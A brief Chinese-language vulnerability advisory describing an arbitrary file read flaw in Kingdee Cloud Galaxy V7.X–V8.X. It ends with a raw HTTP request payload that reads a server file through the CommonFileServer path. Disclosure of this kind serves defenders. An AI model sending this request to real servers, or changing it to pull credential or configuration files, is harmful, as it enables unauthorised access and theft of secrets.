**漏洞描述：**

金蝶云星空V7.X、V8.X所有私有云和混合云版本存在一个通用漏洞，攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。

**影响版本：**

金蝶云星空V7.X-V8.X所有私有云和混合云版本

**Payload：**

```
GET /CommonFileServer/c%3A%2Fwindows%2Fwin.ini HTTP/1.1
Host:host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

---
